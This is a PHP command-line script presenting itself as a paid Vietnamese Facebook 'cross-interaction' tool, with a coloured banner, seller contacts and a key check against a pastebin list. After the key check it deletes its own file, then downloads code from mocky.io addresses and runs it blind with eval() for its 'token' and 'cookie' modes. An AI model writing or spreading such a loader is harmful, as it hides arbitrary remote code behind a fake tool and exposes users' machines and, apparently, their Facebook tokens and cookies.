<?php
error_reporting(0);
session_start();
date_default_timezone_set("Asia/Ho_Chi_Minh");
$Ngay='date "+%d/%m/%Y"';
$Gio='date "+%H:%M"';
$res="\033[0m";
$hong="\033[1;35m";
$trang="\033[1;37m";
$xnhac= "\033[1;96m";
$den="\033[1;90m";
$do="\033[1;91m";
$luc="\033[1;92m";
$vang="\e[1;93m";
$xduong="\e[1;94m";
$BBlack="\033[1;30m" ;      
$BRed="\033[1;31m"         ;
$BGreen="\033[1;32m"       ;
$BYellow="\033[1;33m"   ;
$BBlue="\033[1;34m"        ;
$BPurple="\033[1;35m"      ;
$BCyan="\033[1;36m"   ;
$BWhite="\033[1;37m"    ;
$Blue="\033[0;34m";
$res="\033[0m";
$red="\033[1;31m";
$BGreen="\033[1;32m";
$cyan="\033[1;36m";
$yellow="\033[1;33m";
$turquoise="\033[1;34m";
$lightSkyBlue="\033[1;35m";
$maufullznhac= "\033[1;47;1;34m";
system("clear");
system("rm ".__FILE__);
$cuongdz = $do."[".$luc."●".$do."] ".$trang."=> ";
$cuongvip = $do."[".$luc."●".$do."]";
$thanhngang = $vang."==========================================================\n";
$banner="\r\r
\033[1;37m\033[1;40m\033[1;40m ✅ TOOL MIỄN PHÍ    :$cyan Nguyễn Minh Mạnh
\033[1;37m\033[1;37m\033[1;40m\033[1;40m ✅ FACEBOOK         :$cyan lxavierav
\033[1;37m\033[1;37m\033[1;40m\033[1;40m ✅ ZALO             :$cyan 0963.603.983
\033[1;37m\033[1;37m\033[1;40m\033[1;40m ✅ LINK TOOL+KEY    :$cyan Xnxx.com
\n";
@system('clear');
echo $banner;
echo $thanhngang;
echo "\033[1;92m\033[1;92m=> Mua Code Và Key Liên Hệ Facebook https://www.facebook.com/lxavierav\n";
echo "\033[1;97m\033[1;31m=> Tool Vip Phí v3\n";
echo "\033[1;97m\033[1;40m=> Facebook\033[1;97m\033[1;97m : \033[1;92mhttps://www.facebook.com/lxavierav \n";
echo "\033[1;97m\033[1;40m=> zalo\033[1;97m\033[1;97m     : \033[1;92m0963603983 \n";
echo "\033[1;97m\033[1;40m=> web\033[1;97m\033[1;97m      : \033[1;92mXnxx.com \n";
echo $thanhngang;
$a = getlink("https://pastebin.com/raw/31iHWz51");
$cong = 1;
echo "\033[1;97m~\033[1;92m Nhập Api Đã Mua\033[1;97m: \033[1;93m";
$nhapkey = trim(fgets(STDIN));
while (true) {
    $key = explode('"',$a)[$cong];
    if ($nhapkey == $key) {
        echo "\033[1;93mKey Đúng, Key Của Bạn Là ".$key."\n";
        break;
    }
    if ($key == "") { 
        die("\033[1;91mKey Sai! Vui Lòng Mua Key\n");
    }
    $cong = $cong +2;
}
echo $thanhngang;
echo $luc."╔═════════════════════╗\n";
echo $luc."║ ".$xnhac."Tool Tương Tác Chéo ".$luc."║\n";  
echo $luc."╚═════════════════════╝\n";
echo $cuongdz."[".$vang."1".$luc."] Tool Tương Tác Chéo Token \n";
echo $cuongdz."[".$vang."2".$luc."] Tool Tương Tác Chéo Cookie \n";
echo $thanhngang;
echo $cuongdz."".$luc."Nhập Số: $vang";
$chontool = trim(fgets(STDIN));
if ($chontool == '1'){
	if(!$sock = @fsockopen('www.google.com', 80))
{
    echo 'Vui lòng bật kết nối mạng';
    exit();
}
	eval(getlink('https://run.mocky.io/v3/5361a4dc-fb4f-4048-8b5c-96310cdbafc2'));
}else if ($chontool == '2'){
  eval(getlink('https://run.mocky.io/v3/cd66c0b5-94ff-4dcc-aa33-dc504d839072'));
	}else{exit($do."Nhập Sai Vui Lòng Nhập Số 1 Hoặc 2\n");}
function getlink($url){
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Vui lòng kiểm tra lại kết nối hoặc có thể do lỗi máy chủ!';
        die();
    }
    curl_close($ch);
    return $result;
}
